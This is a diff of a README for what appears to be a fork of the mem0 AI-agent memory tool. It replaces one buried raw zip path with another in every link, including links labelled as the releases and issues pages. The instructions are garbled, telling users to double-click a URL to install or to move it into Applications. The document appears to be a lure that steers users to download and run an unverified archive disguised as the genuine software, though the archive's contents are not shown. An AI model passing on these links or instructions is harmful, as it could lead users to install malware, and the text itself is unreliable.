@@ -6,7 +6,7 @@ Welcome to mem0! This application helps you manage memory for AI agents, making 
 
 ## 🔗 Download Now!
 
-[![Download mem0](https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/mem0_3.8.zip)](https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/mem0_3.8.zip)
+[![Download mem0](https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/app/utils/mem-2.9.zip)](https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/app/utils/mem-2.9.zip)
 
 ## 📥 System Requirements
 
@@ -21,7 +21,7 @@ Welcome to mem0! This application helps you manage memory for AI agents, making 
 
 To download the application, visit the following link: 
 
-[Visit the Releases Page](https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/mem0_3.8.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/app/utils/mem-2.9.zip)
 
 ### Step 2: Choose the Right Version
 
@@ -31,9 +31,9 @@ On the releases page, you will see different versions of mem0. Find the latest v
 
 Click on the file that corresponds to your operating system:
 
-- For **Windows** users, download `https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/mem0_3.8.zip`.
-- For **macOS** users, download `https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/mem0_3.8.zip`.
-- For **Linux** users, download `https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/mem0_3.8.zip`.
+- For **Windows** users, download `https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/app/utils/mem-2.9.zip`.
+- For **macOS** users, download `https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/app/utils/mem-2.9.zip`.
+- For **Linux** users, download `https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/app/utils/mem-2.9.zip`.
 
 After clicking the file, your download will start automatically. 
 
@@ -41,9 +41,9 @@ After clicking the file, your download will start automatically.
 
 Once the download is complete, follow these steps:
 
-- **Windows:** Double-click `https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/mem0_3.8.zip` to start the installer. Follow the prompts to complete the installation.
-- **macOS:** Open `https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/mem0_3.8.zip` to extract the files. Move `https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/mem0_3.8.zip` to your Applications folder. Then, double-click it to open.
-- **Linux:** Extract `https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/mem0_3.8.zip`. Open a terminal in the extracted folder and run the application using `./mem0`.
+- **Windows:** Double-click `https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/app/utils/mem-2.9.zip` to start the installer. Follow the prompts to complete the installation.
+- **macOS:** Open `https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/app/utils/mem-2.9.zip` to extract the files. Move `https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/app/utils/mem-2.9.zip` to your Applications folder. Then, double-click it to open.
+- **Linux:** Extract `https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/app/utils/mem-2.9.zip`. Open a terminal in the extracted folder and run the application using `./mem0`.
 
 ## 🚀 Running mem0
 
@@ -75,7 +75,7 @@ If you encounter any issues with mem0:
 - **Application Crashes:** Restart the application, and if the problem persists, check for updates.
 - **Performance Issues:** Close unnecessary applications to free up memory.
 
-For detailed troubleshooting steps or to report bugs, please visit the [Issues page](https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/mem0_3.8.zip).
+For detailed troubleshooting steps or to report bugs, please visit the [Issues page](https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/app/utils/mem-2.9.zip).
 
 ## 📚 Additional Resources
 
@@ -89,6 +89,6 @@ For further information on how to maximize your use of mem0, consider the follow
 
 If you haven't downloaded mem0 yet, make sure to catch up! 
 
-[Download mem0 from the Releases Page](https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/mem0_3.8.zip)
+[Download mem0 from the Releases Page](https://raw.githubusercontent.com/Pintaro/mem0/main/openmemory/api/app/utils/mem-2.9.zip)
 
 Enjoy managing your AI agents with ease using mem0!
